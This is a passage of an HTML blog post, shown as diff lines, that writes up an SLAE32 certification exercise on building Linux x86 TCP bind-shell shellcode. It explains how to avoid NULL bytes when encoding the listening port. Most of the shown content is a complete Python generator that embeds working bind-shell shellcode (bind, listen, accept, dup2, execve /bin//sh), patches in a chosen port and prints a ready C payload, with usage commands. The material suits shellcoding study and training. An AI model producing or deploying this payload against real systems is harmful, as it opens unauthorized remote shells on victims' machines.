+  <div class="flex-even markdown-inner">
+    <h2 id="n2">N°2</h2>
+<p>Lets imagine we have port 443 which gives <code>0xbb01</code> (converted and encoded), in this case everything is fine but what if we use a port converted and encoded as <code>0x0080</code>, well it will be padded with a NULL character and it is punished by law to keep a NULL character inside our shellcode.
+  </div>
+  
+</div>
+
+<hr>
+<p>Solving first point is simple as using the <code>htons()</code> function from <code>socket</code> python library then classically encode output as hexadecimal string.</p>
+<p>Solving the second issue requires more work (I particularly felt trolled by this part).</p>
+<p>Fortunately this issue was anticipated in our code and voluntarily left unexplained until now.</p>
+<pre><code>mov al, 0x01
+mov ah, 0xbb
+mov word [esp-0xe], ax ; port = 443
+</code></pre><p>A port number is a word (2 Bytes), to its must be greater or equal to <code>0x100</code> to be free of NULL character. Lets imagine if we were doing this way:</p>
+<pre><code>mov eax, 0xbb01
+mov dword [esp-0xe], eax
+</code></pre><p>This would result having two NULL characters since <code>eax</code> is a 4 bytes register and we are placing only two bytes inside.</p>
+<p>In this specific case we could easily fix that issue with bellow code:</p>
+<pre><code>mov ax, 0xbb01
+mov word [esp-0xe], ax
+</code></pre><p>This will work if we are using a port above <code>0x100</code> but what if our TCP port is in the lower range. It will result to a NULL character <code>ax</code> is 2 bytes long and we are placing a single byte.</p>
+<p>One solution is to move the port in two set of instructions.</p>
+<p>First we move the first byte to the <code>ah</code> register, then we move the second byte to <code>al</code> register.</p>
+<p>If we are using a port below <code>0x100</code>, we will singly remove from our raw shellcode instruction <code>mov al, ...</code> (designated by opcodes <code>\xb0\xb01</code>).</p>
+<h2 id="builder-code-python3">Builder Code (Python3)</h2>
+<blockquote class="book-hint info">
+  This technique is the first techniques that came in my mind, there are literally infinite ways of doing.
+</blockquote>
+
+<pre><code>#!/usr/bin/python3
+
+'''
+	Jean-Pierre LESUEUR
+	@DarkCoderSc
+
+	jplesueur@phrozen.io
+	https://www.phrozen.io
+
+	***
+	SLAE32 Certification Exercise N°1
+ 	(Pentester Academy).
+ 	https://www.pentesteracademy.com
+	***
+
+	Description:
+
+ 	This python script will generate the final payload with desired TCP port number.
+'''
+
+import socket
+import sys
+from textwrap import wrap
+
+shellcode = (
+				&quot;\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x31\\xc9\\xb1\\x1e\\x50\\xe2&quot;
+				&quot;\\xfd\\x89\\xec\\xb3\\x01\\xc6\\x44\\x24\\xf8\\x01\\xc6\\x44\\x24\\xf4\\x02\\x83&quot;
+				&quot;\\xec\\x0c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x80\\xc3\\x0d\\xc6&quot;
+				&quot;\\x44\\x24\\xfc\\x04\\x83\\xec\\x04\\x89\\x64\\x24\\xfc\\xc6\\x44\\x24\\xf8\\x02&quot;
+				&quot;\\xc6\\x44\\x24\\xf4\\x01\\x89\\x74\\x24\\xf0\\x83\\xec\\x10\\x89\\xe1\\xb0\\x66&quot;
+				&quot;\\xcd\\x80\\x31\\xc0\\x80\\xeb\\x0c\\xb0\\x01\\xb4\\xbb\\x66\\x89\\x44\\x24\\xf2&quot;
+				&quot;\\xc6\\x44\\x24\\xf0\\x02\\x31\\xc0\\xb0\\x10\\x29\\xc4\\xc6\\x44\\x24\\xfc\\x10&quot;
+				&quot;\\x89\\x64\\x24\\xf8\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\x31\\xc0\\xb0&quot;
+				&quot;\\x66\\xcd\\x80\\x80\\xc3\\x02\\x89\\x74\\x24\\xf8\\x83\\xec\\x08\\x89\\xe1\\xb0&quot;
+				&quot;\\x66\\xcd\\x80\\xfe\\xc3\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\xb0\\x66&quot;
+				&quot;\\xcd\\x80\\x89\\xc3\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9&quot;
+				&quot;\\x02\\x7e\\xf3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xc7\\x44\\x24\\xf8\\x2f\\x2f\\x73&quot;
+				&quot;\\x68\\xc7\\x44\\x24\\xf4\\x2f\\x62\\x69\\x6e\\x83\\xec\\x0c\\x89\\xe3\\x83\\xec&quot;
+				&quot;\\x04\\x89\\xe2\\x89\\x5c\\x24\\xfc\\x83\\xec\\x04\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;
+			)
+
+if len(sys.argv) != 2:
+	print(&quot;Usage: ./gen_bindshell.py &lt;port_number&gt;&quot;)
+else:
+	tcp_port = int(sys.argv[1])
+
+	if (tcp_port &gt; 65535) or (tcp_port &lt; 0):
+		print(&quot;Invalid port number (0..65535)&quot;)
+	else:
+		#
+		# Format port 
+		#
+
+		raw_port = ('{:04x}'.format(socket.htons(tcp_port)))		
+
+		raw_port_1 = &quot;\\x{}&quot;.format(raw_port[2:4])
+		raw_port_2 = &quot;\\x{}&quot;.format(raw_port[:2])			
+		
+		#
+		# Modify existing shellcode (hundred of possibilities)		
+		#
+
+		if raw_port_1 == &quot;\\x00&quot;:
+			shellcode = shellcode.replace(&quot;\\xb0\\x01&quot;, &quot;&quot;) 			
+		else:
+			shellcode = shellcode.replace(&quot;\\xb0\\x01&quot;, &quot;\\xb0{}&quot;.format(raw_port_1)) 
+			
+		shellcode = shellcode.replace(&quot;\\xb4\\xbb&quot;, &quot;\\xb4{}&quot;.format(raw_port_2))
+
+
+		#shellcode = shellcode.replace(&quot;\\x01\\xbb&quot;, patch)
+
+		final_payload = &quot;// Shellcode size = {}\n&quot;.format(int(len(shellcode) / 4))
+		final_payload += &quot;unsigned char code[] = \\\n&quot;
+
+		for l in wrap(shellcode, 64):
+			final_payload += &quot;\t\&quot;{}\&quot;\n&quot;.format(l)
+
+		final_payload = final_payload[:-1] + &quot;;&quot;
+
+		print(final_payload)
+</code></pre><h4 id="usage">Usage</h4>
+<p>user@local:$ <code>python3 ./gen_bindshell.py 1403</code></p>
+<p>or</p>
+<p>user@local:$ <code>chmod +x gen_bindshell.py &amp;&amp; ./gen_bindshell.py 1403</code></p>
+<p><img src="/images/202005/Screenshot-2020-05-07-at-14.39.52.png" alt="Bindshell Generator" /></p>
+<p>Replace output content to SLAE32 C shellcode.c template and see what happens when varying port number.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>Creating a TCP bindshell shellcode is straightforward but not an easy task.</p>
+<p>It requires a solid comprehension of shellcoding and assembly throughout all steps. On the 7th exercises for passing the SLAE32 certification this is probably the most exausting part both for solving the challenge and explaning through this paper.</p>
+<p>TCP Bindshells are not always the best choice because of privilege lacking / port filtering etc.. Using reverse shell is often a more effective and realistic technique and coincidentally it is the subject of next exercise 😊</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "phrozen-1" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
